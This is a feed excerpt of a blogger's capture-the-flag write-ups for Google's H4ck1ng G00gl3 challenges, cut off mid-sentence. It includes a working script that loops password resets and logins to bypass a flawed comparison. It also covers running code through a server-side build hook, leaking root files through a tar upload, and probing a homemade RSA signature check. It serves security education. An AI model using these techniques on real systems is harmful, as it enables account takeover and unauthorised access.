</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch02/</guid><description>Exploit H4ck1ng G00gl3 ep004 challenge 02: find vulnerabilities, bypass string comparison, and reset passwords to log in as &apos;tin&apos; and reveal the flag.</description><pubDate>Sun, 20 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;In this challenge, we are given some code. We have to find the
vulnerability and login as &quot;tin&quot;. Let&apos;s check the code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/hashed-passwords.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I found two hardcoded users and their hashed passwords in the &quot;users.js&quot;
file. My first idea was to try and bruteforce somehow the password for
&quot;tin&quot;, but to no avail. I also searched for the value in some rainbow
tables on the internet, but it didn&apos;t work out.&lt;/p&gt;
&lt;p&gt;In that file, I also found a function to reset the password with a
comment saying: &quot;we don&apos;t allow admins to reset passwords&quot;. &quot;tin&quot; is not
an admin, and that comment makes me think it has to be an important
detail. However, I don&apos;t see how this helps me now, so I wrote it down
and continued reading the code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/reset-password.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I found another interesting file, &quot;safe-equals.js&quot;. It&apos;s strange because
&lt;strong&gt;the developers programmed their own version of constant time string
comparison&lt;/strong&gt;. Programming your own cryptographic functions is dangerous.
For sure, there must be some vulnerability hidden here. At first glance,
it seems to be correct. I didn&apos;t pay the required attention to the code.
I read it fast and thought it was comparing each letter of the string
position by position, regardless of the first position where the letters
differed.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/safe-equal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That made me lose a lot of time double-checking other parts of the code.
I went to ask the community. Effectively, the &lt;strong&gt;&quot;safeEqual&quot; function is
vulnerable&lt;/strong&gt;. I had to come back and read it again. This time I decided
to check line by line and check on the internet the documentation for
every function. After that, I understood the problem. It isn&apos;t comparing
each value stored in each position of the strings passed as input.
Instead, &lt;strong&gt;it compares the indices of the first appearance of every
number that the loop is iterating&lt;/strong&gt;. I&apos;m not sure I explained myself
there, so let me put it in an example.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// Example: call the function with two strings of the same length
function safeEqual(&apos;abc123&apos;, &apos;a1b2c3&apos;) {
    let match = true;

    // For our input, this condition is not met
    if(a.length !== b.length) {
        // This is not executed
        match = false;
    }

    const l = a.length; // l = 6
    // Iterate from 0 to 5
    for (let i = 0; i &amp;lt; l; i++) {
      // Compare the index of value &quot;i&quot; in both strings.
      // For i = 0 -&amp;gt; a.indexOf(0) === b.indexOf(0) -&amp;gt; -1 === -1 -&amp;gt; true
      // For i = 1 -&amp;gt; a.indexOf(1) === b.indexOf(1) -&amp;gt; 4 === 1 -&amp;gt; false
      // ...
      match &amp;amp;&amp;amp;= a.indexOf(i) === b.indexOf(i);
    }


  return match;
}

safeEqual(&apos;abc123&apos;, &apos;a1b2c3&apos;) // returns false
safeEqual(&apos;abcd&apos;, &apos;qwer&apos;) // returns true
safeEqual(&apos;ab12c&apos;, &apos;qw121&apos;) // returns true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The function checks that the first occurrence of each number in both
strings returns the same index. If you think about it, that means that
any two strings without numbers will return true. &lt;strong&gt;The trick then is to
reset &quot;tin&quot; password until it creates a hash without numbers. Then, we
must log in with a password that produces a hash without numbers.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, I searched for a password that produced a hash without numbers.
It was simple. I just computed in a for loop the hash value for strings
of different lengths with the letter &quot;a&quot; (e.g., &quot;a&quot;, &quot;aa&quot;, &quot;aaa&quot;). The
result was that a &lt;strong&gt;string containing seventy-three &quot;a&quot; produces a hash
without numbers&lt;/strong&gt;. That is our password. The second step was creating a
script that automatically called the reset password endpoint and then
tried to log in with the password we computed.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;const requestPromise = require(&apos;request-promise&apos;).defaults({ jar: true });

var loginOptions = {
    method: &apos;POST&apos;,
    uri: &apos;https://vrp-website-web.h4ck.ctfcompetition.com/login&apos;,
    form: {
        username: &apos;tin&apos;,
        password: &apos;a&apos;.repeat(73)
    },
    followAllRedirects: true,
};

var resetOptions = {
    method: &apos;POST&apos;,
    uri: &apos;https://vrp-website-web.h4ck.ctfcompetition.com/reset-password&apos;,
    form: {
        username: &apos;tin&apos;
    },
};

(async function () {
    let i = 0;
    let incorrect = true;
    while (incorrect) {
        const loginResponse = await requestPromise(loginOptions);
        incorrect = /Incorrect/.test(loginResponse);
        console.log(i);
        i++;

        if (!incorrect) {
            console.log(loginResponse);
            break;
        }

        await requestPromise(resetOptions);
    }
})();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Executing the script returns the response with the flag. With that, we
completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep005 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch01/</guid><description>Decode H4ck1ng G00gl3 ep005 challenge 01: manipulate binary data, discover hidden drawings, and stitch images together to reveal the final URL.</description><pubDate>Mon, 28 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep005
challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This challenge gives us a zip containing a binary file. After reading
the hint, I tried to convert the file into different image formats, but
it didn&apos;t work. I also checked if the file contained headers from any
known format, searched strings in the file and visualized the
hexadecimal. Nothing of that worked. I tried things out for a couple
more hours with no luck. Eventually, I had to ask the community for
help.&lt;/p&gt;
&lt;p&gt;It turns out that the ones and zeros from the binary form the drawing.
The first thing that I tried was printing the binary data. It was hard
for me to check for patterns, so I coloured the ones.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Extract a single line with all bits
xxd -b challenge.bin | cut -d\  -f2-7 | tr -d &apos; &apos; | tr -d &apos;\n&apos; &amp;gt; binary
# Change the color of the ones
cat binary | sed &quot;s/1/\\\e[0;31m1\\\e[0m/g&quot; &amp;gt; binary_color
# Print text with colors
echo -e $(cat binary_color)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/colored-binary-output.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;They don&apos;t seem to follow a pattern, but an image has a height and
width. We have to find it somehow. After some iterations modifying the
width, I found a drawing with a width equal to 96.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/colored-binary-drawing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The problem now is that it contains several images, from top to bottom.
We can form a URL if we arrange them properly. I put them next to each
other with a height equal to 25. I also took a moment to write a python
script and only print the ones.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;content = &quot;&quot;
with open(&quot;binary&quot;, &quot;r&quot;) as f:
    content = f.read()

width = 96
chunks = [content[i:i+width] for i in range(0, len(content), width)]

height = 25

for i in range(0, height):
    colored_chunk = &quot;&quot;
    line = &quot;&quot;
    for j in range(0, 10):
        line += chunks[i + (height*j)]
    for letter in line:
        if letter == &quot;1&quot;:
            colored_chunk += &quot;1&quot;
        else:
            colored_chunk += &quot; &quot;
    print(colored_chunk)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/wide-drawing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Still, the URL was not readable. Therefore, I manually made screenshots
of different parts of the binary and put them together like in a
collage.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/images-together.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch03/</guid><description>Complete H4ck1ng G00gl3 ep004 challenge 03: Explore hidden tabs, read server-side scripts, and use creative commits to reveal the flag.</description><pubDate>Mon, 21 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;In that challenge, we only have the hint. So, I went ahead to the
webpage used in this episode. Next to the &quot;FAQs&quot; tab, I found the
&quot;Contributing&quot; tab.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/contributing-tab.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;However, the tab isn&apos;t clickable. Moreover, you have to be authenticated
to access the URL
&lt;a href=&quot;https://vrp-website-web.h4ck.ctfcompetition.com/contributing&quot;&gt;https://vrp-website-web.h4ck.ctfcompetition.com/contributing&lt;/a&gt;. That was
a minor inconvenience, but I remember that the &lt;strong&gt;code in challenge two
had some layouts of the different web pages&lt;/strong&gt;. I returned to it and
found the &lt;strong&gt;&quot;contributing.hbs&quot;&lt;/strong&gt; inside the views folder.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/view-folder.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This file explains how to get started contributing.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/contributing-hbs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;In theory, we only need to clone the repository, modify something,
create a branch and push it. Cloning the repository works as expected,
but pushing an empty branch will return an error.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/prereceive-hook-declined.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Among the output, we can read: &quot;remote: Skipping presubmit (enable via
push option)&quot;. I decided to &lt;strong&gt;enable the presubmit option&lt;/strong&gt; and see what
happens.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/presubmit-enabled.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Now, the go command is not found. I installed it on my local machine,
but nothing changed. It seems that the &lt;strong&gt;&quot;build.sh&quot; is executed on the
server side, not the client side.&lt;/strong&gt; So, I decided to read the script.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/build-sh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/configure-flags.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;As we can see in the previous images, what it does is rather simple. The
scripts initialize a couple of variables and print some information on
the screen. However, notice the comment in the &quot;configure_flags.sh&quot;.
&lt;strong&gt;We have to bump the version before pushing a new change. Hence, I
created a new commit with a new version.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/version-changes.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The output printed the new version &quot;0.1.2&quot;. What would happen if I try
to read the &quot;flag&quot; file? With that idea, I modified the script.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/version-prints-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After creating another commit with this new change and executing the
push, we can read the flag in the output. With that, we completed the
challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep004 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep004ch01/</guid><description>Crack H4ck1ng G00gl3 ep004 challenge 01: explore endpoints, use .tar.gz files and dry run features, and trick the system into revealing the flag.</description><pubDate>Sun, 20 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep004
challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;When we open the challenge, it redirects us to a &lt;a href=&quot;https://vrp-website-web.h4ck.ctfcompetition.com/&quot;&gt;copy of Google Bug
Hunter webpage&lt;/a&gt; of the
&lt;a href=&quot;https://bughunters.google.com/&quot;&gt;original Google Bug Hunter webpage&lt;/a&gt;.
The hint suggests searching for some new endpoints. After researching, I
found the &lt;strong&gt;difference in the FAQs section&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/faqs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We can start playing with the endpoints. First, I start sending a POST
request to the import endpoint.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-missing-submission.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It is missing the submission parameter. Let&apos;s add it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-dry-run-enabled.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Interesting. The import endpoint is disabled, but the &lt;strong&gt;dry run is
enabled&lt;/strong&gt;. I tried enabling it but couldn&apos;t find the correct query
parameter. So, I decided to give the export endpoint a try.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/export-submission-does-not-exist.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/export-attachment-does-not-exist.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The export endpoint shows us that a submission called
&quot;submission_sample&quot; already exists and that each submission has
different attachments. But I couldn&apos;t figure out how to proceed with the
challenge.&lt;/p&gt;
&lt;p&gt;I asked the community for help, and they told me to &lt;strong&gt;solve the other
challenges first&lt;/strong&gt;. Therefore, I decided to solve challenges two and
three. &lt;strong&gt;Challenge two gives us some code. With this code, we can access
some more code required to solve challenge number three&lt;/strong&gt;. It turns out
this code contains the import and export functions. We can now see how
to access the dry run feature.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-code-dry-run.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;That isn&apos;t enough to solve the challenge. I kept reading the import
code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-attachment-already-exists.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I found a couple of interesting details. First, the &lt;strong&gt;endpoint expects a
.tar.gz file&lt;/strong&gt;. Second, &lt;strong&gt;the endpoint will output the difference if the
file already exists&lt;/strong&gt;. We want to get the flag, so we can probably
&lt;strong&gt;trick the endpoint into printing the content by uploading a .tar.gz
containing a &quot;flag&quot; file&lt;/strong&gt;. We know the flag must be in the root path.
Therefore, we will use &quot;/&quot; as the value for the submission field.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-tar-with-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Okay, we have to turn on the debug to see the differences.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/import-tar-with-flag-debug.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Making this call will return us the flag! With that, we completed the
challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep004ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep005 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep005ch02/</guid><description>Crack H4ck1ng G00gl3 ep005 challenge 02: exploit cryptographic vulnerabilities, manipulate scores and signatures to trigger an integer overflow, and reveal the flag.</description><pubDate>Fri, 02 Dec 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep005
challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Cryptography&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This challenge includes a website and its source code. My first thought
is that we will have to find and exploit a vulnerability in the code.
But first, let&apos;s see the website.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/website-game.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The website is a game similar to Google&apos;s Dinosaur Game. We can jump to
dodge the enemies or use the nest to capture them. Once we die, we need
to introduce a name. Then we will see the ranking.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep005ch02/website-game-ranking.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Time to read the code. Fast enough, I see a comment telling us the goal.
We have to get a negative score in the game to get the flag.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@app.route(&quot;/api/highscores&quot;, methods=[&quot;post&quot;])
def post_highscore():
    ...
    if score &amp;lt; 0:
        # FIX(mystiz): I heard that some players are so strong that the score is overflown.
        #              I&apos;ll send them the flag and hope the players are satisfied for now...
        return {&quot;message&quot;: f&quot;You performed so well so that you triggered an integer overflow! &quot;
                + &quot;This is your flag: {FLAG}&quot;}
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that we know what we have to accomplish, let&apos;s see which validations
the backend does when it receives a new high score.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@app.route(&quot;/api/highscores&quot;, methods=[&quot;post&quot;])
def post_highscore():
    global highscores

    data = request.get_json()

    try:
        name = data.get(&apos;name&apos;)
        score = data.get(&apos;score&apos;)
        signature = bytes.fromhex(data.get(&apos;signature&apos;, &apos;&apos;))
    except:
        return json_response(400, text=&quot;invalid parameters&quot;)

    if type(name) != str or len(name) != 3:
        return json_response(400, text=&quot;invalid name&quot;)
    if type(score) != int or not -2**16 &amp;lt;= score &amp;lt; 2**16:
        return json_response(400, text=&quot;invalid score&quot;)

    try:
        verify(KEY_ID, name, score, signature)
    except Exception as err:
        return json_response(400, text=err)

    player = {&quot;name&quot;: name, &quot;score&quot;: score}
    highscores.append(player)
    highscores = sorted(highscores, key=lambda row: row[&apos;score&apos;], reverse=True)

    if len(highscores) &amp;gt; 10:
        highscores.pop(10)

    if score &amp;lt; 0:
        # FIX(mystiz): I heard that some players are so strong that the score is overflown.
        #              I&apos;ll send them the flag and hope the players are satisfied for now...
        return {&quot;message&quot;: f&quot;You performed so well so that you triggered an integer overflow! &quot;
                + &quot;This is your flag: {FLAG}&quot;}
    elif player in highscores:
        rank = highscores.index(player) + 1
        return {&quot;message&quot;: f&quot;Congratulations! You are currently at #{rank} on the scoreboard!&quot;}
    else:
        return {&quot;message&quot;: f&quot;Better luck next time!&quot;}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The endpoint needs to receive a name, a score and a signature. Then, it
verifies that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The name length is 3&lt;/li&gt;
&lt;li&gt;The score is between -65536 and 65535, both included.&lt;/li&gt;
&lt;li&gt;The signature is valid&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This endpoint is not a problem. As long as we provide: a name, a
negative score and a signature for that data, we will obtain the flag.
Let&apos;s see how the endpoint creates the signature now.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;@app.route(&quot;/api/sign&quot;, methods=[&quot;post&quot;])
def sign():
     data = request.get_json()

     name = data.get(&apos;name&apos;)
     score = data.get(&apos;score&apos;)

     if type(name) != str or len(name) != 3:
         return json_response(400, text=&quot;invalid name&quot;)
     if type(score) != int or score &amp;lt; 0:
         return json_response(400, text=&quot;invalid score&quot;)

     return {&quot;signature&quot;: _sign(KEY_ID, name, score).hex()}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we have a problem. This endpoint only accepts positive values.
Hence, we must find a flaw that allows us to forge a signature for a
negative value. Lucky for us, the developers implemented their own
&quot;sign&quot; and &quot;verify&quot; methods. Needless to say that rolling your own
crypto is a bad idea. I decided to read them and see if I could find the
vulnerability.&lt;/p&gt;
&lt;p&gt;First, we will look at the &quot;sign&quot; method.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# https://datatracker.ietf.org/doc/html/rfc2313#section-10.1
    def sign(self, m):
        digest_algorithm_identifier = DerSequence([
            DerObjectId(&apos;2.16.840.1.101.3.4.2.1&apos;).encode(),
            DerNull().encode()
        ])
        digest = hashlib.sha256(m).digest()

        digest_info = DerSequence(([
            digest_algorithm_identifier,
            DerOctetString(digest).encode()
        ]))

        encryption_block  = bytes.fromhex(&apos;00&apos;) 
        encryption_block += bytes.fromhex(&apos;01&apos;) # block type for signature
        encryption_block += b&apos;\xff&apos;*(self.bits//8 - 3 - len(digest_info.encode()))
        encryption_block += bytes.fromhex(&apos;00&apos;)
        encryption_block += digest_info.encode()

        encryption_block = int.from_bytes(encryption_block, &apos;big&apos;)
        s = pow(encryption_block, self.d, self.n)
        s = int.to_bytes(s, self.bits//8, &apos;big&apos;)

        return s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This method creates a byte array with the following specific structure.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;00 01 ff ... ff 00 &quot;digest information&quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;At first glance, the &quot;sign&quot; method doesn&apos;t seem vulnerable. Let&apos;s jump
to the &quot;verify&quot; method.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# https://datatracker.ietf.org/doc/html/rfc2313#section-10.2
# Note: The only hash algorithm we accept is SHA256.
    def verify(self, m, s):
        if len(s) != self.bits//8:
            raise Exception(&apos;incorrect signature length&apos;)
        s = int.from_bytes(s, &apos;big&apos;)

        k = pow(s, self.e, self.n)
        k = int.to_bytes(k, self.bits//8, &apos;big&apos;)
        if k[0] != 0x00:
            raise Exception(&apos;incorrect prefix&apos;)
        if k[1] != 0x01:
            raise Exception(&apos;incorrect prefix&apos;)

        padding, digest_info = k[2:].split(b&apos;\x00&apos;, 1)

        if len(padding) &amp;lt; 8:
            raise Exception(&apos;invalid padding length&apos;)
        if padding != b&apos;\xff&apos;*len(padding):
            raise Exception(&apos;invalid padding content&apos;)

        sequence = DerSequence()
        sequence.decode(digest_info)
        _digest_algorithm_identifier, _digest = sequence

        sequence = DerSequence()
        sequence.decode(_digest_algorithm_identifier)
        _digest_algorithm_identifier = sequence[0]

        object_id = DerObjectId()
        object_id.decode(_digest_algorithm_identifier)
        digest_algorithm_identifier = object_id.value
        if digest_algorithm_identifier != &apos;2.16.840.1.101.3.4.2.1&apos;:
            raise Exception(&apos;invalid digest algorithm identifier&apos;)

        _null = sequence[1]
        null = DerNull()
        null.decode(_null)

        octet_string = DerOctetString()
        octet_string.decode(_digest)
        digest = octet_string.payload

        if hashlib.sha256(m).digest() != digest:
            raise Exception(&apos;mismatch digest&apos;)
        return True
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This function is more complex. It verifies that the signature follows
the correct structure we saw before
&lt;code&gt;00 01 ff ... ff 00 &quot;digest information&quot;&lt;/code&gt; and that the message we are
passing matches the signature. However, the vulnerability must be here.
For that reason, we have to take a closer look. There doesn&apos;t seem to be
any flaw, but the devil is in the details. So I read and studied it more
deeply. After a couple of hours, I couldn&apos;t see any problem by myself. I
felt like I was maybe going down the rabbit hole. I came back to the api
